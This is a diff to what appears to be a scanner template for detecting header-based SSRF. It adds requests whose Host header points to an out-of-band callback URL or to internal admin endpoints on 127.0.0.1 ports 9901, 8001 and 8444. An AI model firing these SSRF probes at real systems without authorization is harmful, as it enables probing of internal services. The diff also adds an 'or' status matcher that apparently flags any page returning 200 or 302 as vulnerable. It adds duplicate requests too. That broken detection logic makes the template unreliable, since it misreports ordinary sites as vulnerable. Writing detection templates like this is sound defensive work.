@@ -1,4 +1,4 @@
-id: header-ssrf
+id: header-injection
 
 info:
   name: Header SSRF Injection
@@ -37,6 +37,12 @@ http:
 
       - |
         GET @{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+        Connection: close
+
+      - |
+        GET {{BaseURL}} HTTP/1.1
         Host: {{Hostname}}
         User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
         Connection: close
@@ -159,10 +165,46 @@ http:
         User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
         Connection: close
 
+      - |
+        HEAD / HTTP/1.1
+        Host: {{interactsh-url}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+        Connection: close
+
+      - |
+        HEAD / HTTP/1.1
+        Host: {{interactsh-url}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+        Connection: close
+
+      - |
+        GET /stats HTTP/1.1
+        Host: 127.0.0.1:9901
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+        Connection: close
+
+      - |
+        GET /services HTTP/1.1
+        Host: 127.0.0.1:8001
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+        Connection: close
+
+      - |
+        GET /services HTTP/1.1
+        Host: 127.0.0.1:8444
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+        Connection: close
 
     stop-at-first-match: true
     redirects: true
+    matchers-condition: or
     matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+        condition: or
+
       - type: word
         part: interactsh_protocol
         words:
